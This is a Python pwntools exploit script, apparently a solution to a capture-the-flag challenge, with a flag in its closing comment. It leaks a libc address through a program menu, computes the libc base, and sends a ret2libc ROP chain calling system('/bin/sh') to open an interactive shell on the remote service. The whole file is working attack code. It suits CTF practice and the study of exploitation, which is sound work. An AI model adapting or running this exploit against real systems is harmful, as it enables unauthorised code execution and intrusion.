
from pwn import *

r = remote('chal.pctf.competitivecyber.club', 4444)

lib = ELF('./libc.so.6')

puys_off = lib.sym['puts']

for i in range(22):
    r.recvuntil(b' >> ')
    r.sendline(b'2')
    r.recvuntil(b' >> ')
    r.sendline(b'1')
    r.recvuntil(b' >> ')
    r.sendline(b'y')

r.recvuntil(b' >> ')
r.sendline(b'2')
r.recvuntil(b' >> ')
r.sendline(b'3')

puts = int(r.recvuntil(b' >> ').decode().split(' ')[37], 16)

LIBC_BASE = puts - puys_off
ADDR_BINSH = next(lib.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = lib.symbols['system'] + LIBC_BASE

r.sendline(b'y')
print(r.recvuntil(b' >> '))

r.sendline(b'1')
r.recvuntil(b' >> ')
r.sendline(b'y')
r.sendline(b'A' * 38)
r.recvuntil(b' >> ')
r.recv()
r.sendline(b'3')
r.recvuntil(b' >> ')

pop_rdi = 0x000000000002a3e5  # : pop rdi; ret;

p = b'A' * 56
p += p64(LIBC_BASE + pop_rdi+1)
p += p64(LIBC_BASE + pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()

# PCTF{r3t_2_libc_pl0x_52706196}
